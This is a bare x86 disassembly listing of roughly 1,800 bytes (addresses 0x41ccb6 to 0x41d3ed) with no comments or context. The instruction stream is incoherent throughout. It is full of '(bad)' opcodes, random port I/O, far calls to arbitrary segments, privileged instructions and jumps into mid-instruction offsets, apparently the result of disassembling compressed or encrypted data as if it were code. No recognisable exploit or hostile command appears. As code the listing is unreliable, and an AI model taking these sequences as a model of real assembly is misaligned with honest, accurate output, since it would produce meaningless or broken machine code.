  41ccb6:	pop    esp
  41ccb7:	cwde   
  41ccb8:	fsub   DWORD PTR [edi+0x37614e4e]
  41ccbe:	xchg   ebp,eax
  41ccbf:	outs   dx,DWORD PTR ds:[esi]
  41ccc0:	ror    BYTE PTR [eax],1
  41ccc2:	push   ss
  41ccc3:	ja     0x41cc9b
  41ccc5:	cmp    eax,0xa9398f15
  41ccca:	call   0x8843dfe5
  41cccf:	leave  
  41ccd0:	neg    di
  41ccd3:	ffreep st(6)
  41ccd5:	in     al,dx
  41ccd6:	sbb    esp,DWORD PTR [eax+0x1ab893c6]
  41ccdc:	sub    BYTE PTR [ecx+ecx*8],0x7f
  41cce0:	std    
  41cce1:	inc    edi
  41cce2:	jae    0x41cd06
  41cce4:	jns    0x41cd39
  41cce6:	xchg   ecx,eax
  41cce7:	push   ss
  41cce8:	out    0x35,al
  41ccea:	je     0x41cce5
  41ccec:	mov    bl,0x99
  41ccee:	jae    0x41ccdc
  41ccf0:	and    BYTE PTR [ebx],ah
  41ccf2:	mov    WORD PTR [edi+0x59],?
  41ccf5:	push   esp
  41ccf6:	mov    BYTE PTR [ecx],dl
  41ccf8:	mov    al,ah
  41ccfa:	inc    ebp
  41ccfb:	out    0x25,eax
  41ccfd:	inc    ebx
  41ccfe:	inc    ecx
  41ccff:	xchg   ecx,eax
  41cd00:	jae    0x41cca9
  41cd02:	inc    ebp
  41cd03:	mov    ds:0xddceeea0,al
  41cd08:	out    0x8e,eax
  41cd0a:	dec    ebx
  41cd0b:	add    DWORD PTR [ebx+0x3bcc675d],edx
  41cd11:	inc    esi
  41cd12:	pop    ebp
  41cd13:	loop   0x41ccad
  41cd15:	sub    esi,DWORD PTR [edi]
  41cd17:	push   0x11
  41cd19:	add    BYTE PTR [ecx+ebp*1+0x4d4e6db4],0xcc
  41cd21:	imul   ecx,DWORD PTR [eax+eiz*2],0xfffffff3
  41cd25:	scas   eax,DWORD PTR es:[edi]
  41cd26:	dec    ebx
  41cd27:	jo     0x41cd0c
  41cd29:	sar    BYTE PTR [ecx+ebx*2-0x70],cl
  41cd2d:	add    eax,ecx
  41cd2f:	jno    0x41cdaf
  41cd31:	cld    
  41cd32:	and    bl,BYTE PTR [eax-0x262e7f68]
  41cd38:	outs   dx,DWORD PTR ds:[esi]
  41cd39:	js     0x41cd5f
  41cd3b:	in     al,dx
  41cd3c:	pop    edx
  41cd3d:	ret    0x523
  41cd40:	imul   edx,esp,0xffffffa1
  41cd43:	pusha  
  41cd44:	cmp    DWORD PTR [edi],edi
  41cd46:	mov    WORD PTR [ebp+0x7c],gs
  41cd49:	repz and al,bl
  41cd4c:	mov    edi,0xf551d609
  41cd51:	das    
  41cd52:	mov    al,ds:0x588c2cda
  41cd57:	ror    DWORD PTR [ebx-0x4d2c9517],0x5e
  41cd5e:	addr16 adc al,0x96
  41cd61:	adc    ebx,DWORD PTR [edx+0x3c]
  41cd64:	bound  esi,QWORD PTR [eax+ecx*4-0x25]
  41cd68:	repnz dec ecx
  41cd6a:	iret   
  41cd6b:	dec    edx
  41cd6c:	test   DWORD PTR [esi],ecx
  41cd6e:	cmp    eax,0x96d87a41
  41cd73:	mov    ds:0x76d75ffc,al
  41cd78:	mov    WORD PTR [edi+0x12be2781],ds
  41cd7e:	sahf   
  41cd7f:	cmp    eax,0xe3c7b645
  41cd84:	mov    esi,0x7dc8797a
  41cd89:	les    ebp,FWORD PTR [ebp-0x3f07a528]
  41cd8f:	fsubr  DWORD PTR [edx+0x137a6414]
  41cd95:	out    0x6c,eax
  41cd97:	mov    ds:0x8aa605e8,al
  41cd9c:	out    0x1d,eax
  41cd9e:	jg     0x41cd9f
  41cda0:	sub    BYTE PTR [ebp-0x2403ec0f],dh
  41cda6:	sbb    al,0xf3
  41cda8:	push   ebp
  41cda9:	(bad)  
  41cdab:	repz sub eax,0x5b7f7c73
  41cdb1:	xchg   DWORD PTR [eax],eax
  41cdb3:	addr16 (bad) 
  41cdb5:	loopne 0x41cd60
  41cdb7:	xlat   BYTE PTR ds:[ebx]
  41cdb8:	loope  0x41cdeb
  41cdba:	(bad)  
  41cdbb:	in     al,dx
  41cdbc:	call   0x7656:0x9f04755b
  41cdc3:	fdiv   QWORD PTR [eax-0x1b3f7fc]
  41cdc9:	mov    dh,0x74
  41cdcb:	xor    al,0xae
  41cdcd:	xchg   edx,eax
  41cdce:	sub    al,0xd4
  41cdd0:	inc    ebp
  41cdd1:	sbb    eax,0x42d00d79
  41cdd6:	(bad)  
  41cdd7:	cwde   
  41cdd8:	aaa    
  41cdd9:	ror    BYTE PTR [edx],cl
  41cddb:	jae    0x41cdaa
  41cddd:	addr16 rcr eax,cl
  41cde0:	icebp  
  41cde1:	sub    al,0xcf
  41cde3:	les    esi,FWORD PTR [esi]
  41cde5:	pusha  
  41cde6:	pop    edi
  41cde7:	push   DWORD PTR [esi-0x1a]
  41cdea:	(bad)  
  41cdeb:	clc    
  41cdec:	fcomp  QWORD PTR [edi+0x12d13248]
  41cdf2:	and    ch,cl
  41cdf4:	adc    al,0xb6
  41cdf6:	dec    esi
  41cdf7:	clc    
  41cdf8:	dec    ebx
  41cdf9:	bound  ebx,QWORD PTR [edx]
  41cdfb:	fwait
  41cdfc:	retf   
  41cdfd:	repnz mov bh,0xe5
  41ce01:	add    ebx,DWORD PTR [esi-0x54750466]
  41ce07:	lds    edx,FWORD PTR [esi+eax*2]
  41ce0a:	and    DWORD PTR [eax+0x3a930cfb],esp
  41ce10:	xlat   BYTE PTR ds:[ebx]
  41ce11:	cwde   
  41ce12:	mov    ds:0x9c92927c,eax
  41ce17:	jmp    0xe941be8d
  41ce1c:	in     al,dx
  41ce1d:	dec    ebp
  41ce1e:	repz sbb esp,DWORD PTR [esi]
  41ce21:	ins    BYTE PTR es:[edi],dx
  41ce22:	xchg   esp,eax
  41ce23:	test   DWORD PTR [edx+0x137be689],esi
  41ce29:	inc    esi
  41ce2a:	sub    eax,0x11e300e6
  41ce2f:	fcomp  QWORD PTR [ecx]
  41ce31:	lds    ecx,FWORD PTR [ecx-0x621da916]
  41ce37:	hlt    
  41ce38:	and    BYTE PTR [edx],bh
  41ce3a:	mov    BYTE PTR [edx-0x333d2aa7],ah
  41ce40:	adc    al,0x69
  41ce42:	and    al,BYTE PTR [eax+0x41a1272e]
  41ce48:	into   
  41ce49:	xchg   edi,eax
  41ce4a:	repnz push ss
  41ce4c:	adc    bl,BYTE PTR [esi]
  41ce4e:	jbe    0x41cdfd
  41ce50:	(bad)  
  41ce51:	mov    cs:0x98ea3089,eax
  41ce57:	push   es
  41ce58:	mov    bl,0xce
  41ce5a:	stos   BYTE PTR es:[edi],al
  41ce5b:	and    al,0x2a
  41ce5d:	ja     0x41ce7c
  41ce5f:	leave  
  41ce60:	jmp    0xb533:0x73ed90a0
  41ce67:	mov    WORD PTR [edx+edi*8+0x69],?
  41ce6b:	mov    al,0x24
  41ce6d:	add    BYTE PTR [edx+ebp*4+0x54d38c15],0x8
  41ce75:	cmp    ebx,0x45
  41ce78:	sub    eax,0x1604af38
  41ce7d:	xchg   edi,eax
  41ce7e:	mov    ebx,0xf5403597
  41ce83:	inc    ebx
  41ce84:	xchg   ebx,eax
  41ce85:	popa   
  41ce86:	(bad)  
  41ce87:	xlat   BYTE PTR ds:[ebx]
  41ce88:	sbb    ah,bl
  41ce8a:	call   0xcf83:0x3191d843
  41ce91:	pop    ss
  41ce92:	int    0x2f
  41ce94:	xchg   edx,esi
  41ce96:	rcl    DWORD PTR [edi],1
  41ce98:	fisub  DWORD PTR [edi+edx*8-0x5008b2df]
  41ce9f:	mov    al,0x64
  41cea1:	pop    es
  41cea2:	cmp    BYTE PTR [esi+0x75],cl
  41cea5:	hlt    
  41cea6:	cmp    ch,ah
  41cea8:	and    ecx,DWORD PTR [ecx+0x2bc00a40]
  41ceae:	xor    eax,0xcaa4ac6f
  41ceb3:	pop    es
  41ceb4:	std    
  41ceb5:	jno    0x41cea0
  41ceb7:	je     0x41cee9
  41ceb9:	scas   al,BYTE PTR es:[edi]
  41ceba:	ss addr16 dec edi
  41cebd:	and    dl,BYTE PTR [ecx+0x79022ac4]
  41cec3:	pop    ebx
  41cec4:	adc    BYTE PTR [eax+eax*2-0x5d],ah
  41cec8:	inc    esp
  41cec9:	jle    0x41ceeb
  41cecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cecc:	adc    DWORD PTR [edx+0x16],ecx
  41cecf:	out    0x9a,al
  41ced1:	gs inc esi
  41ced3:	call   0x8e04:0xe05e60c4
  41ceda:	xchg   edi,eax
  41cedb:	adc    DWORD PTR [eax],esp
  41cedd:	sbb    dh,BYTE PTR [edx+0x12]
  41cee0:	hlt    
  41cee1:	repz mov dl,0x5f
  41cee4:	div    BYTE PTR [eax]
  41cee6:	fwait
  41cee7:	lahf   
  41cee8:	arpl   WORD PTR [eax-0x44],cx
  41ceeb:	cmp    DWORD PTR [eax-0x23272921],0x2d
  41cef2:	push   ebx
  41cef3:	push   edi
  41cef4:	dec    esp
  41cef5:	jge    0x41cf1c
  41cef7:	xchg   esp,eax
  41cef8:	push   0x61
  41cefa:	mov    BYTE PTR [esi],ah
  41cefc:	inc    ecx
  41cefd:	stc    
  41cefe:	shl    DWORD PTR [ebp+0x7a],cl
  41cf01:	loopne 0x41cf6d
  41cf03:	call   0xb65c:0x20690dee
  41cf0a:	cmp    eax,0x4a878d4e
  41cf0f:	inc    esi
  41cf10:	and    eax,0x8c425f51
  41cf15:	jmp    0x730b9d83
  41cf1a:	xor    DWORD PTR [edx-0x3adba4e7],ebp
  41cf20:	inc    esp
  41cf21:	fst    QWORD PTR [ecx-0x265c9136]
  41cf27:	lock push 0xe2c5c422
  41cf2d:	scas   al,BYTE PTR es:[edi]
  41cf2e:	(bad)  
  41cf2f:	sub    DWORD PTR [esi-0x35],edx
  41cf32:	cmp    DWORD PTR [ecx-0x78fdd8c1],esi
  41cf38:	lahf   
  41cf39:	fistp  WORD PTR [ecx-0x55]
  41cf3c:	test   BYTE PTR [esi-0x59],0x94
  41cf40:	retf   0x8cb4
  41cf43:	dec    DWORD PTR [edi]
  41cf45:	pop    ss
  41cf46:	dec    edi
  41cf47:	jae    0x41cf59
  41cf49:	hlt    
  41cf4a:	jns    0x41cfa0
  41cf4c:	mov    ebx,0x37f009a7
  41cf51:	jg     0x41cf73
  41cf53:	fidivr WORD PTR ds:0xe3fd6206
  41cf59:	inc    edx
  41cf5a:	xor    DWORD PTR gs:[ebx+0x3f],esp
  41cf5e:	xchg   ecx,eax
  41cf5f:	mov    esi,0xbf3c0fb5
  41cf64:	stc    
  41cf65:	mov    ds:0xb1812d19,eax
  41cf6a:	mov    ebp,DWORD PTR [ebx]
  41cf6c:	jmp    0xe9cbb5fe
  41cf71:	cs jge 0x41cfe0
  41cf74:	mov    esi,0xf363481b
  41cf79:	out    0x61,eax
  41cf7b:	jg     0x41cf9c
  41cf7d:	mov    bh,0xe6
  41cf7f:	cld    
  41cf80:	jmp    0x41cfb7
  41cf82:	rcr    ch,0x10
  41cf85:	adc    ah,BYTE PTR [edx-0x283927f2]
  41cf8b:	jne    0x41cfaf
  41cf8d:	ror    eax,cl
  41cf8f:	ret    
  41cf90:	fsubr  DWORD PTR [ebx+0x336a3e7d]
  41cf96:	sti    
  41cf97:	cmp    al,0x4a
  41cf99:	xchg   edi,eax
  41cf9a:	cmp    cl,BYTE PTR [ecx+esi*4+0x6267648d]
  41cfa1:	(bad)  
  41cfa2:	jb     0x41cf39
  41cfa4:	cmp    DWORD PTR [ecx+eax*8-0x768bfbd0],esi
  41cfab:	call   0xa2484ad6
  41cfb0:	fimul  WORD PTR [edi-0x8]
  41cfb3:	jmp    DWORD PTR [esi-0x30]
  41cfb6:	xchg   edi,eax
  41cfb7:	push   eax
  41cfb8:	das    
  41cfb9:	fcmovnu st,st(7)
  41cfbb:	jne    0x41cfbb
  41cfbd:	mov    cl,0x49
  41cfbf:	sbb    ebp,0xcaf4ae0d
  41cfc5:	outs   dx,BYTE PTR ds:[esi]
  41cfc6:	scas   eax,DWORD PTR es:[edi]
  41cfc7:	push   0x105ffeed
  41cfcc:	fs jo  0x41cf97
  41cfcf:	dec    edi
  41cfd0:	pop    ss
  41cfd1:	add    DWORD PTR [edi+0x5b662dbf],edx
  41cfd7:	stc    
  41cfd8:	sbb    al,0x64
  41cfda:	inc    ebp
  41cfdb:	xchg   ebp,eax
  41cfdc:	cld    
  41cfdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfde:	or     DWORD PTR [eax-0x65],0x41
  41cfe2:	fcmovne st,st(4)
  41cfe4:	sub    ebx,ebx
  41cfe6:	mov    cl,0xa1
  41cfe8:	xchg   ecx,eax
  41cfe9:	rcl    ah,cl
  41cfeb:	push   0x77de05f3
  41cff0:	or     cl,bh
  41cff2:	push   ss
  41cff3:	xchg   esp,eax
  41cff4:	pop    edi
  41cff5:	(bad)  
  41cff6:	adc    cl,al
  41cff8:	cwde   
  41cff9:	outs   dx,DWORD PTR ds:[esi]
  41cffa:	out    0x6b,al
  41cffc:	ret    
  41cffd:	not    BYTE PTR [edi+0x3e950750]
  41d003:	xchg   esp,eax
  41d004:	scas   eax,DWORD PTR es:[edi]
  41d005:	push   0x155dc371
  41d00a:	jbe    0x41cf8d
  41d00c:	push   es
  41d00d:	sti    
  41d00e:	jae    0x41cfd9
  41d010:	pop    ds
  41d011:	scas   al,BYTE PTR es:[edi]
  41d012:	sti    
  41d013:	ss xchg esi,eax
  41d015:	stos   BYTE PTR es:[edi],al
  41d016:	add    eax,DWORD PTR [eax-0x79]
  41d019:	outs   dx,DWORD PTR ds:[esi]
  41d01a:	ins    DWORD PTR es:[edi],dx
  41d01b:	ds pop esi
  41d01d:	cwde   
  41d01e:	push   esi
  41d01f:	(bad)  
  41d020:	loope  0x41d084
  41d022:	mov    edx,0x4c2fbffe
  41d027:	mov    ebp,DWORD PTR [esi-0x61a04b8f]
  41d02d:	lods   eax,DWORD PTR ds:[esi]
  41d02e:	es fdivrp st(3),st
  41d031:	add    esi,ebx
  41d033:	pusha  
  41d034:	mov    ebp,0x6bcd6e51
  41d039:	mov    esp,0xb0c60ee5
  41d03e:	enter  0x7304,0x46
  41d042:	jmp    0x2d84:0xe360ce7d
  41d049:	shr    DWORD PTR [eax],0x9f
  41d04c:	mov    esp,0xd7d0da1a
  41d051:	in     eax,0x53
  41d053:	xor    BYTE PTR [ecx-0x24138f71],dl
  41d059:	div    DWORD PTR [esi-0x10]
  41d05c:	mov    BYTE PTR [edi+0x609609c3],bl
  41d062:	inc    BYTE PTR [edi-0x1b]
  41d065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d066:	imul   edx,DWORD PTR [edi-0x26],0x65
  41d06a:	test   eax,0x44091329
  41d06f:	pop    ds
  41d070:	inc    ebp
  41d071:	mov    edx,0xd6e3b5a7
  41d076:	sbb    al,0xec
  41d078:	dec    DWORD PTR [edi+0x8cbd37e]
  41d07e:	pop    ds
  41d07f:	rcl    BYTE PTR [ebx+0x273008cf],cl
  41d085:	cmp    eax,0xa98056ac
  41d08a:	out    0xcd,eax
  41d08c:	in     al,dx
  41d08d:	pusha  
  41d08e:	push   0x55
  41d090:	iret   
  41d091:	mov    ch,0x5b
  41d093:	call   0x5cdf:0xd72f06e0
  41d09a:	loop   0x41d11a
  41d09c:	jl     0x41d01e
  41d09e:	ret    0x35fa
  41d0a1:	lods   al,BYTE PTR ds:[esi]
  41d0a2:	add    ecx,DWORD PTR [ecx+ebp*1]
  41d0a5:	cli    
  41d0a6:	jae    0x41d0c3
  41d0a8:	mov    ebp,0x14025d0f
  41d0ad:	adc    BYTE PTR [eax+0x4d],ch
  41d0b0:	cmp    esp,DWORD PTR [ecx+0x63]
  41d0b3:	or     cl,BYTE PTR [ebx+ecx*2-0x1b]
  41d0b7:	lods   al,BYTE PTR ds:[esi]
  41d0b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0b9:	jnp    0x41d0b3
  41d0bb:	cs int3 
  41d0bd:	pushf  
  41d0be:	push   ss
  41d0bf:	arpl   WORD PTR [edx+0x34],si
  41d0c2:	pop    esp
  41d0c3:	jge    0x41d0d3
  41d0c5:	ret    0xee28
  41d0c8:	ds or  eax,0x1da867b7
  41d0ce:	mov    ebp,ds
  41d0d0:	sbb    al,0xa3
  41d0d2:	xor    bl,BYTE PTR [ebx]
  41d0d4:	and    eax,0xd5f3a8f8
  41d0d9:	std    
  41d0da:	(bad)  
  41d0db:	js     0x41d10a
  41d0dd:	and    ebx,DWORD PTR [eax+0x2c99b17b]
  41d0e3:	test   edx,edi
  41d0e5:	stc    
  41d0e6:	sbb    ah,cl
  41d0e8:	call   0x97170a70
  41d0ed:	rcl    DWORD PTR ds:0x1f0ccaad,1
  41d0f3:	ins    DWORD PTR es:[edi],dx
  41d0f4:	mov    DWORD PTR [eax],ebp
  41d0f6:	in     al,dx
  41d0f7:	fst    DWORD PTR [edx+0x1c0b6554]
  41d0fd:	xchg   ebx,eax
  41d0fe:	and    DWORD PTR [ecx-0x3b],eax
  41d101:	adc    BYTE PTR [esi+eiz*2],ah
  41d104:	pop    esi
  41d105:	dec    ecx
  41d106:	jmp    0x6f3adf90
  41d10b:	pop    esp
  41d10c:	dec    esi
  41d10d:	aad    0xa5
  41d10f:	shr    BYTE PTR [ecx-0x34],cl
  41d112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d113:	addr16 inc ebp
  41d115:	sbb    eax,0x64706429
  41d11a:	cmp    al,0x6d
  41d11c:	push   ebx
  41d11d:	int3   
  41d11e:	cli    
  41d11f:	outs   dx,DWORD PTR ds:[esi]
  41d120:	push   cs
  41d121:	adc    esi,esi
  41d123:	int3   
  41d124:	dec    ebp
  41d125:	gs sub dl,bh
  41d128:	dec    ecx
  41d129:	add    ebx,DWORD PTR [edi-0x30]
  41d12c:	(bad)  
  41d12d:	xor    BYTE PTR [esi],ch
  41d12f:	jmp    0xc41b:0x3ca36a44
  41d136:	xchg   edx,eax
  41d137:	pop    ds
  41d138:	ins    DWORD PTR es:[edi],dx
  41d139:	add    bl,BYTE PTR [ecx]
  41d13b:	sub    al,0x20
  41d13d:	xor    DWORD PTR [esi+0x78],esi
  41d140:	add    BYTE PTR [ecx-0x20],ah
  41d143:	lock imul ecx,esi,0xffffffd1
  41d147:	je     0x41d0e3
  41d149:	ja     0x41d144
  41d14b:	sbb    al,0xe3
  41d14d:	inc    esi
  41d14e:	add    eax,0xb679ca89
  41d153:	(bad)  
  41d154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d155:	mov    dh,0x56
  41d157:	ret    
  41d158:	sub    BYTE PTR [edx+0x6c],cl
  41d15b:	ins    BYTE PTR es:[edi],dx
  41d15c:	out    dx,eax
  41d15d:	fidivr DWORD PTR [esi+0x13bbc22c]
  41d163:	and    al,0x91
  41d165:	xchg   DWORD PTR [eax],ecx
  41d167:	jno    0x41d177
  41d169:	adc    DWORD PTR [esp+ecx*8],ebx
  41d16c:	fistp  DWORD PTR [edx]
  41d16e:	sbb    ebx,DWORD PTR [ebx+0x7d2532c3]
  41d174:	and    dl,cl
  41d176:	sti    
  41d177:	cld    
  41d178:	jl     0x41d1bc
  41d17a:	mov    ah,0x3b
  41d17c:	add    DWORD PTR [esi+0x76d1b8d],esi
  41d182:	stos   DWORD PTR es:[edi],eax
  41d183:	jp     0x41d10f
  41d185:	ret    
  41d186:	addr16 jae 0x41d1d9
  41d189:	inc    edx
  41d18a:	jp     0x41d17e
  41d18c:	out    0x2c,eax
  41d18e:	sub    eax,0x94141275
  41d193:	cmp    al,0x1d
  41d195:	dec    esp
  41d196:	(bad)  
  41d197:	cdq    
  41d198:	xor    dh,dh
  41d19a:	xor    BYTE PTR [si+0x3e56],ah
  41d19f:	push   ss
  41d1a0:	mov    cl,0x63
  41d1a2:	dec    eax
  41d1a3:	dec    esp
  41d1a4:	cmp    BYTE PTR [ebx],cl
  41d1a6:	inc    ebp
  41d1a7:	cs pusha 
  41d1a9:	sbb    eax,0x351d186f
  41d1ae:	dec    ecx
  41d1af:	imul   ebx,ecx,0xacbc4fba
  41d1b5:	add    al,0xef
  41d1b7:	mov    al,0xdf
  41d1b9:	xor    eax,0xb33b35fc
  41d1be:	mov    ebp,DWORD PTR [ecx-0x49]
  41d1c1:	mov    eax,0x21eaed75
  41d1c6:	std    
  41d1c7:	pop    ss
  41d1c8:	jne    0x41d1b8
  41d1ca:	sar    DWORD PTR [edx+eiz*2-0x6dd71be1],cl
  41d1d1:	and    esi,eax
  41d1d3:	ret    
  41d1d4:	pop    esi
  41d1d5:	xor    al,0xfa
  41d1d7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1d9:	mov    ah,0x51
  41d1db:	sub    cl,ch
  41d1dd:	scas   al,BYTE PTR es:[edi]
  41d1de:	ficomp DWORD PTR [eax-0x27]
  41d1e1:	mov    ds:0x86dba6dd,al
  41d1e6:	jb     0x41d224
  41d1e8:	pop    esi
  41d1e9:	cmp    DWORD PTR [edi],esp
  41d1eb:	mov    ebx,0x6370cbfb
  41d1f0:	lods   eax,DWORD PTR ds:[esi]
  41d1f1:	into   
  41d1f2:	sar    al,0xb1
  41d1f5:	adc    ecx,ecx
  41d1f7:	test   al,0x6e
  41d1f9:	ins    BYTE PTR es:[edi],dx
  41d1fa:	daa    
  41d1fb:	mov    edi,0x23c9f1e5
  41d200:	ja     0x41d214
  41d202:	mov    ds:0x38eb0639,al
  41d207:	push   0x5b2fd592
  41d20c:	sbb    eax,0x6ef6d52e
  41d211:	dec    esi
  41d212:	jmp    0x3b36:0x84e9b3bd
  41d219:	rol    BYTE PTR [edi],1
  41d21b:	adc    BYTE PTR [ebx],al
  41d21d:	inc    esi
  41d21e:	cmp    BYTE PTR [esi-0x17355bb8],0x7c
  41d225:	add    DWORD PTR [esi],ebx
  41d227:	push   esi
  41d228:	xchg   esi,eax
  41d229:	ds int3 
  41d22b:	adc    ah,BYTE PTR [edi-0x7f721763]
  41d231:	aaa    
  41d232:	(bad)  
  41d233:	push   ss
  41d234:	popf   
  41d235:	xlat   BYTE PTR ds:[ebx]
  41d236:	mov    WORD PTR [eax+0x11],?
  41d239:	je     0x41d26f
  41d23b:	stos   DWORD PTR es:[edi],eax
  41d23c:	popa   
  41d23d:	xchg   ebx,eax
  41d23e:	rcr    DWORD PTR [ecx-0x78],cl
  41d241:	push   ds
  41d242:	out    0x75,eax
  41d244:	xchg   ebp,eax
  41d245:	dec    ebp
  41d246:	mov    dh,0xad
  41d248:	sub    DWORD PTR [ebx-0x35bbf08],esi
  41d24e:	mov    bl,0xa3
  41d250:	imul   esi,DWORD PTR [eax],0x622ce05f
  41d256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d257:	aaa    
  41d258:	sti    
  41d259:	lea    ebx,[eax]
  41d25b:	inc    esi
  41d25c:	(bad)  
  41d25d:	hlt    
  41d25e:	call   FWORD PTR [ebx]
  41d260:	cmp    bl,al
  41d262:	out    dx,al
  41d263:	jns    0x41d2ba
  41d265:	fs or  bl,bl
  41d268:	(bad)  
  41d269:	(bad)
  41d26c:	fst    QWORD PTR [ebx+0x1]
  41d26f:	inc    edi
  41d270:	hlt    
  41d271:	or     DWORD PTR ds:0xebe9b34d,0x267900d7
  41d27b:	cs push edi
  41d27d:	(bad)  
  41d27e:	fwait
  41d27f:	fwait
  41d280:	xchg   ebx,eax
  41d281:	pop    esi
  41d282:	retf   0xba03
  41d285:	cs push cs
  41d287:	leave  
  41d288:	ins    DWORD PTR es:[edi],dx
  41d289:	(bad)  
  41d28a:	mov    edx,0xfe3e5521
  41d28f:	and    al,0x24
  41d291:	sub    al,0xcd
  41d293:	pop    ds
  41d294:	xor    bl,BYTE PTR [edi+0x3f]
  41d297:	out    0x3,al
  41d299:	gs jnp 0x41d230
  41d29c:	test   BYTE PTR [edi-0xb17e6ef],0x3d
  41d2a3:	ja     0x41d2d9
  41d2a5:	sub    ebp,DWORD PTR [ebx]
  41d2a7:	and    bh,BYTE PTR fs:[ecx+ecx*8]
  41d2ab:	lds    eax,FWORD PTR [edx-0x14]
  41d2ae:	adc    ebp,DWORD PTR [ebx+0x723b26f0]
  41d2b4:	mov    WORD PTR [ecx+0x2c3fd447],?
  41d2ba:	dec    ebp
  41d2bb:	bound  ebx,QWORD PTR ds:0x8b72638e
  41d2c1:	mov    eax,ds:0xc19d619
  41d2c6:	dec    ebp
  41d2c7:	not    edi
  41d2c9:	scas   eax,DWORD PTR es:[edi]
  41d2ca:	cmp    edi,DWORD PTR ds:0x5e2d94ee
  41d2d0:	add    eax,0x48ddab43
  41d2d5:	shl    BYTE PTR [edi],cl
  41d2d7:	mov    WORD PTR [ebp-0x6a],es
  41d2da:	jmp    0xbe4e59bc
  41d2df:	cwde   
  41d2e0:	aam    0xb7
  41d2e2:	jge    0x41d2c7
  41d2e4:	push   esi
  41d2e5:	pop    edx
  41d2e6:	mov    dl,0xd7
  41d2e8:	mov    ds:0x5296c9e7,al
  41d2ed:	pop    eax
  41d2ee:	inc    edi
  41d2ef:	ret    
  41d2f0:	(bad)  
  41d2f1:	int    0xdd
  41d2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2f4:	jecxz  0x41d29b
  41d2f6:	sbb    DWORD PTR [edi+0x14d383a7],edi
  41d2fc:	lock fucom st(2)
  41d2ff:	cld    
  41d300:	dec    ebp
  41d301:	add    esp,ebp
  41d303:	pop    esp
  41d304:	dec    edx
  41d305:	neg    edi
  41d307:	dec    esp
  41d308:	mov    dh,0xcd
  41d30a:	pop    ebx
  41d30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d30c:	leave  
  41d30d:	pop    ecx
  41d30e:	push   ss
  41d30f:	and    ah,BYTE PTR [edi-0x2e]
  41d312:	mov    eax,0x6c448c90
  41d317:	or     bl,0xb1
  41d31a:	inc    ebp
  41d31b:	jb     0x41d2ff
  41d31d:	jle    0x41d342
  41d31f:	sub    BYTE PTR [ebp+0x17],dh
  41d322:	pop    edi
  41d323:	bound  ebp,QWORD PTR [ecx-0x78]
  41d326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d327:	rol    cl,0x18
  41d32a:	inc    ebx
  41d32b:	into   
  41d32c:	mov    ch,0x11
  41d32e:	pushf  
  41d32f:	xchg   ecx,eax
  41d330:	adc    ecx,DWORD PTR gs:[eax-0x34beb2df]
  41d337:	inc    ebx
  41d338:	enter  0x4410,0xd0
  41d33c:	dec    ebp
  41d33d:	jmp    FWORD PTR [esi+0x52]
  41d340:	fwait
  41d341:	jb     0x41d313
  41d343:	or     DWORD PTR [ebx-0x8ed54cd],ecx
  41d349:	imul   edx,DWORD PTR [ebx],0x5b
  41d34c:	push   esi
  41d34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d34e:	lds    edi,FWORD PTR [esi-0x22]
  41d351:	adc    al,0xb1
  41d353:	pop    ds
  41d354:	jmp    0x41d38d
  41d356:	mov    ebp,0xd9bcf5ea
  41d35b:	xchg   esp,eax
  41d35c:	xor    DWORD PTR [esi-0x7376f97c],0x37
  41d363:	inc    esp
  41d364:	push   es
  41d365:	in     al,0xc6
  41d367:	xchg   BYTE PTR [ebx+0x5b],ch
  41d36a:	dec    edi
  41d36b:	mov    ebp,0x2fd3ad88
  41d370:	sahf   
  41d371:	aas    
  41d372:	lods   eax,DWORD PTR ds:[esi]
  41d373:	cmp    eax,DWORD PTR [ebx+0x26c6a0a1]
  41d379:	and    BYTE PTR [ecx+0x658bce41],cl
  41d37f:	test   al,0x64
  41d382:	in     al,0xa4
  41d384:	mov    ch,BYTE PTR [esi]
  41d386:	mov    bl,0xfe
  41d388:	push   esp
  41d389:	jle    0x41d356
  41d38b:	aaa    
  41d38c:	ins    BYTE PTR es:[edi],dx
  41d38d:	cmp    ebx,DWORD PTR [esp+eiz*8]
  41d390:	jns    0x41d316
  41d392:	pop    DWORD PTR [edi]
  41d394:	push   ss
  41d395:	(bad)  [edx-0x40]
  41d398:	xchg   ecx,eax
  41d399:	sahf   
  41d39a:	stos   BYTE PTR es:[edi],al
  41d39b:	or     edi,DWORD PTR [ebp+0x28]
  41d39e:	dec    ebx
  41d39f:	jg     0x41d361
  41d3a1:	daa    
  41d3a2:	cs inc edx
  41d3a4:	mov    bh,BYTE PTR [ecx-0x15]
  41d3a7:	mov    ah,dh
  41d3a9:	js     0x41d400
  41d3ab:	fidivr WORD PTR [edx+0x51]
  41d3ae:	nop
  41d3af:	push   ds
  41d3b0:	pop    edx
  41d3b1:	addr16 pop ebx
  41d3b3:	js     0x41d386
  41d3b5:	iret   
  41d3b6:	mov    al,0x5
  41d3b8:	inc    ebx
  41d3b9:	dec    ecx
  41d3ba:	aam    0xba
  41d3bc:	in     al,0x19
  41d3be:	fstp   QWORD PTR [esi+0x205e13f4]
  41d3c4:	mov    ebp,0xcb9b8bfd
  41d3c9:	test   dh,bh
  41d3cb:	cmp    DWORD PTR cs:[edx],ecx
  41d3ce:	dec    edx
  41d3cf:	xlat   BYTE PTR ds:[ebx]
  41d3d0:	cmc    
  41d3d1:	dec    esi
  41d3d2:	cmp    eax,0x7c5008ee
  41d3d7:	pop    eax
  41d3d8:	and    DWORD PTR [esp+ecx*4+0x7b4589df],edi
  41d3df:	or     esp,DWORD PTR [ecx+0x6]
  41d3e2:	xor    al,BYTE PTR [eax+0xcaa1ff5]
  41d3e8:	sbb    bh,BYTE PTR [esi+0x41]
  41d3eb:	fnstsw WORD PTR [edx]
  41d3ed:	imul   ecx,DWORD PTR [edi],0xb9f7514d
